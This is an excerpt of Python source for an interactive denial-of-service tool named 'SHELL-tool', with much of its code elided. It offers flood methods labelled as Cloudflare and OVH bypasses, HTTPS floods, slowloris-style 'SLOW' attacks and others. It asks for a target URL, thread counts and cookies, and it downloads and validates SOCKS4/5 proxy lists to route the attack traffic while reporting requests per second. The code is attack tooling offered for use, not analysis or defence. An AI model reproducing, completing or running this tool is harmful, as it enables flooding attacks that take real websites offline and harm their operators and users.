...
def CheckerOption():
	global proxies
	N = str(input(">Do you want to get the proxy socks list? [ Y / n  automatically specified = y ]: "))
	if N == 'y' or N == "" :
	...
	if choice == "4":
		...
		out_file = str(input("> Socks5 proxy file (type socks5.txt): "))
		if out_file == '':
	...
	if len(proxies) == 0:
		...
		sys.exit(1)
	print ("> Number of Socks% s Proxy% s" %(choice,len(proxies)))
	time.sleep(0.03)
	ans = str(input("> Do you want to check if the proxy list works? [ Y / n, specified = y ]: "))
	if ans == "":
		ans = "y"
	if ans == "y":
		ms = str(input("> Flow delay socks [seconds, automatically set = 5]: "))
		if ms == "":
			ms = int(5)
		else :
			try:
...
def OutputToScreen(ind_rlock):
	...
	while 1:
		...
		for k,v in ind_dict.items():
			...
			ind_dict[k] = 0
		ind_rlock.release()
		print("{:^70}".format(" ["+sp_char[i]+"] SHELL-tool| Total Rps:"+str(total)))
		i+=1
		time.sleep(1)
		print("\n"*100)
...
def check_socks(ms):
	...
	for lines in list(proxies):
		...
		time.sleep(0.01)
		sys.stdout.write("> Checked "+str(nums)+" Proxy\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Checked "+str(nums)+" Proxy\r")
		sys.stdout.flush()
	print("\r\n> Checked all proxies, total works: "+str(len(proxies)))
	ans = input("> Do you want to save them to a file? [ y / n, automatically specified = y ]: ")
	if ans == "y" or ans == "":
		if choice == "4":
			...
			fp.close()
			print("> The proxy is stored in socks4.txt.")
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print(">The proxy is stored in socks5.txt ")
...
def downloadsocks(choice):
	if choice == "4":
		...
		try:
			...
			pass
		print("> The socks4 list has already been downloaded as socks4.txt ")
	if choice == "5":
		...
		try:
			...
			f.close()
		print("> The socks5 list has already been downloaded as socks5.txt ")
...
╔════════════════════════════════════╗          
   ...
   1)[GET]            2)[STORM]
   3)[FULLBYPASS]     4)[HTTPSFLOODS] 
   5)[HTTPSOCKET]     6)[Browser] 
   7)[TLS]            8)[RAND] 
   9)[CFB]            10)[CFBUAM]
   11)[CFKILLS]       12)[JSBYPASS] 
   13)[DGB]           14)[OVH] 
   15)[POST]          16)[HEAD] 
   17)[SLOW]          18)[CHECK]                                                                                            
╚════════════════════════════════════╝
...
""")
	...
	mode = InputOption("> Select any method [ automatically specified = TLS ] :",["get","tls","storm","fullbypass","rand","jsbypass","httpsfloods","httpsocket","browser","cfb","cfbuam","cfkills","dgb","ovh","post","head","slow","check"],"TLS")
	url = str(input("> TARGET: ")).strip()
	
	ParseUrl(url)
	if mode == "post":
		mode2 = InputOption("> Do you want to customize the cookie? [ y / n, automatically specified = n ]: ",["y","n","yes","no"],"n")
		if mode2 == "y":
			data = open(str(input("> Enter file direction: ")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
	choice2 = InputOption("> Do you want to customize the cookie? [ y / n, automatically specified = n ]: ",["y","n","yes","no"],"n")
	if choice2 == "y":
		cookies = str(input("Please enter cookies: ")).strip()
	choice = InputOption("> Select socks mode [ 4/5, automatically set = 5] : ",["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	if mode == "check":
		...
		return
	if mode == "slow":	
		thread_num = str(input("> Connect [ automatically specified = 400 ]:"))
	else:
		thread_num = str(input(">Flow [automatically specified- 400] : "))
	if thread_num == "":
		thread_num = int(1000)
	else:
		try:
			...
			sys.exit("Error flow numbers")
	CheckerOption()
	if len(proxies) == 0:
		print("> The proxy is no longer available please download it again.")
		return
	...
	if mode == "slow":
		...
		multiple = str(input("> Enter zoom [ automatically set = 100 ] : "))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		brute = str(input(">Enable speed mode [beta] [ y / n is automatically set to = n ] : "))
		if brute == "":
			brute = False
		elif brute == "y":
			brute = True
